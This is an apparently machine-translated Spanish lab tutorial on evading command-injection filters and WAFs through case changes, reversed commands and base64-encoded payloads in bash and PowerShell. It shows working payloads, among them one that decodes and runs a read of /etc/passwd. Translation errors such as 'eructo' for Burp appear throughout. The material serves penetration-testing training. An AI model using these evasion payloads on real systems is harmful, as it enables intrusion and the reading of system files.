# Obfuscación avanzada de comandos

### Manipulación de casos

Una técnica de ofuscación de comandos que podemos utilizar es la manipulación de casos, como invertir los casos de caracteres de un comando (por ejemplo `WHOAMI`) o alternando entre casos (p. ej. `WhOaMi`). Esto generalmente funciona porque es posible que una lista negra de comandos no verifique diferentes variaciones de casos de una sola palabra, ya que los sistemas Linux distinguen entre mayúsculas y minúsculas.

Si estamos tratando con un servidor Windows, podemos cambiar la carcasa de los caracteres del comando y enviarlo. En Windows, los comandos para PowerShell y CMD no distinguen entre mayúsculas y minúsculas, lo que significa que ejecutarán el comando independientemente del caso en el que esté escrito:

Ofuscación avanzada de comandos

```powershell-session
PS C:\htb> WhOaMi

21y4d
```

Sin embargo, cuando se trata de Linux y un shell bash, que distinguen entre mayúsculas y minúsculas, como se mencionó anteriormente, tenemos que ser un poco creativos y encontrar un comando que convierta el comando en una palabra completamente en minúsculas. Un comando funcional que podemos utilizar es el siguiente:

Ofuscación avanzada de comandos

```shell-session
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d
```

Como podemos ver, el comando funcionó, aunque la palabra que proporcionamos fue (`WhOaMi`). Este comando utiliza `tr` para reemplazar todos los caracteres en mayúsculas con caracteres en minúsculas, lo que da como resultado un comando para todos los caracteres en minúsculas. Sin embargo, si intentamos utilizar el comando anterior con el `Host Checker` aplicación web, veremos que todavía está bloqueada:

**Solicitud POST de eructo**

![Captura de pantalla de una interfaz de aplicación web que muestra una solicitud POST a 127.0.0.1 con encabezados y un intento de inyección de comando. La sección de respuesta muestra HTML para un formulario 'Host Checker', lo que permite la entrada de IP y, como resultado, muestra 'Entrada no válida'.](<../../.gitbook/assets/cmdinj_filters_commands_3 (1).jpg>)

{% hint style="info" %}
¿Puedes adivinar por qué?\
Esto se debe a que el comando anterior contiene espacios, que es un carácter filtrado en nuestra aplicación web. Con tales técnicas debemos siempre asegurarnos de no usar caracteres filtrados; de lo contrario, nuestras solicitudes fracasarán.
{% endhint %}

Una vez que reemplazamos los espacios con pestañas (`%09`), vemos que el comando funciona perfectamente:

**Solicitud POST de eructo**

![Captura de pantalla de una interfaz de aplicación web que muestra una solicitud POST a 127.0.0.1 con encabezados y un intento de inyección de comando. La sección de respuesta muestra HTML para un formulario 'Host Checker', lo que permite la entrada de IP y muestra resultados de ping para 127.0.0.1 con el usuario 'www-data'.](<../../.gitbook/assets/cmdinj_filters_commands_4 (1).jpg>)

Hay muchos otros comandos que podemos usar para el mismo propósito, como el siguiente:

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

Ejercicio: ¿Puedes probar el comando anterior para ver si funciona en tu máquina virtual Linux y luego intentar evitar el uso de caracteres filtrados para que funcione en la aplicación web?

***

### Comandos invertidos

Otra técnica de ofuscación de comandos que discutiremos es invertir los comandos y tener una plantilla de comando que los cambie nuevamente y los ejecute en tiempo real. En este caso, escribiremos `imaohw` en lugar de `whoami` para evitar activar el comando incluido en la lista negra.

Primero, obtenemos la cadena invertida de nuestro comando en la terminal:

Ofuscación avanzada de comandos

```shell-session
OsmanMartinez@htb[/htb]$ echo 'whoami' | rev
imaohw
```

Luego, podemos ejecutar el comando original invirtiéndolo nuevamente en un subshell (`$()`):

Ofuscación avanzada de comandos

```shell-session
21y4d@htb[/htb]$ $(rev<<<'imaohw')

21y4d
```

Vemos que aunque la cadena no contiene la palabra real `whoami`, funciona igual y proporciona el resultado esperado. También podemos probar este comando con el ejercicio y, de hecho, funciona:

**Solicitud POST de eructo**

![Captura de pantalla de una interfaz de aplicación web que muestra una solicitud POST a 127.0.0.1 con encabezados y un intento de inyección de comando. La sección de respuesta muestra HTML para un formulario 'Host Checker', lo que permite la entrada de IP y muestra resultados de ping para 127.0.0.1 con el usuario 'www-data'.](<../../.gitbook/assets/cmdinj_filters_commands_5 (1).jpg>)

Consejo: si desea omitir un filtro de caracteres con el método anterior, también deberá revertirlos o incluirlos al revertir el comando original.

Lo mismo se puede aplicar en Windows. Primero podemos invertir una cadena de la siguiente manera:

Ofuscación avanzada de comandos

```powershell-session
PS C:\htb> "whoami"[-1..-20] -join ''

imaohw
```

Ahora podemos usar el siguiente comando para ejecutar una cadena invertida con un subshell de PowerShell (`iex "$()"`):

Ofuscación avanzada de comandos

```powershell-session
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

21y4d
```

***

### Comandos codificados

La técnica final que discutiremos es útil para comandos que contienen caracteres filtrados o caracteres que el servidor puede decodificar mediante URL. Esto puede permitir que el comando se estropee cuando llega al shell y finalmente no se ejecute. En lugar de copiar un comando existente en línea, esta vez intentaremos crear nuestro propio comando de ofuscación único. De esta forma, es mucho menos probable que un filtro o un WAF lo rechacen. El comando que creemos será único para cada caso, dependiendo de qué caracteres estén permitidos y del nivel de seguridad en el servidor.

Podemos utilizar varias herramientas de codificación, como `base64` (para codificación b64) o `xxd` (para codificación hexadecimal). Tomemos `base64` como ejemplo. Primero, codificaremos la carga útil que queremos ejecutar (que incluye caracteres filtrados):

Ofuscación avanzada de comandos

```shell-session
OsmanMartinez@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

Ahora podemos crear un comando que decodificará la cadena codificada en un subshell (`$()`), y luego la pasará a `bash` para ser ejecutada (es decir, `bash<<<`):

Ofuscación avanzada de comandos

```shell-session
OsmanMartinez@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Como podemos ver, el comando anterior ejecuta la carga perfectamente. No incluimos ningún carácter filtrado y evitamos caracteres codificados que puedan provocar que el comando no se ejecute.

Consejo: Tenga en cuenta que estamos utilizando `<<<` para evitar el uso de una tubería `|`, que es un carácter filtrado.

Ahora podemos usar este comando (una vez que reemplacemos los espacios) para ejecutar el mismo comando mediante inyección de comandos:

**Solicitud POST de eructo**

![Captura de pantalla de una interfaz de aplicación web que muestra una solicitud POST a 127.0.0.1 con encabezados y un intento de inyección de comando utilizando decodificación base64. La sección de respuesta muestra HTML para un formulario 'Host Checker', lo que permite la entrada de IP y muestra resultados de ping para 127.0.0.1 con el usuario 'www-data' e información adicional del usuario.](<../../.gitbook/assets/cmdinj_filters_commands_6 (1).jpg>)

Incluso si algunos comandos estuvieran filtrados, como `bash` o `base64`, podríamos omitir ese filtro con las técnicas que analizamos en la sección anterior (por ejemplo, inserción de caracteres) o usar otras alternativas como `sh` para ejecución de comandos y `openssl` para decodificación b64, o `xxd` para decodificación hexadecimal.

También utilizamos la misma técnica con Windows. Primero, necesitamos codificar en base64 nuestra cadena:

Ofuscación avanzada de comandos

```powershell-session
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```

También podríamos lograr lo mismo en Linux, pero tendríamos que convertir la cadena de `utf-8` a `utf-16` antes de usar `base64`, como sigue:

Ofuscación avanzada de comandos

```shell-session
OsmanMartinez@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA
```

Finalmente, podemos decodificar la cadena b64 y ejecutarla con un subshell de PowerShell (`iex "$()"`):

Ofuscación avanzada de comandos

```powershell-session
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d
```

Como podemos ver, podemos ser creativos con `bash` o `PowerShell` y crear nuevos métodos de omisión y ofuscación que no se han utilizado antes y, por lo tanto, es muy probable que omitan filtros y WAF. Varias herramientas pueden ayudarnos a ofuscar automáticamente nuestros comandos, lo cual analizaremos en la siguiente sección.

Además de las técnicas que analizamos, podemos utilizar muchos otros métodos, como comodines, expresiones regulares, redirección de salida, expansión de números enteros y muchos otros. Podemos encontrar algunas de estas técnicas en: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion

***
